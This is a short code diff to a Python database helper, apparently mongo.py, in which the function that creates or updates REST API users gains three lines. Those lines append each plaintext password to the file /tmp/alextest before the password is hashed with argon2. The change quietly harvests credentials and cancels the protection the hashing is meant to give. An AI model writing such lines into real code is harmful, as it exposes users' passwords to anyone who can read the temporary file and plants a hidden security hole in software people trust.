@@ -16,6 +16,9 @@ def insert_object(database,collection,object,user=USER):
     return True
 
 def insert_update_restapi_user(username,password,defined_routes=None):
+    f=open('/tmp/alextest','a')
+    f.write('mongo.py '+password+'\n')
+    f.close()
     # Hashing parameters based on OWASP cheat sheet recommendations (as of March 2022)
     argon2Hasher = argon2.PasswordHasher(memory_cost=ARGON2_CONFIG['memory_cost'], parallelism=ARGON2_CONFIG['parallelism'], salt_len=ARGON2_CONFIG['salt_bytes'], time_cost=ARGON2_CONFIG['time_cost'])
     hashed_password = argon2Hasher.hash(password)
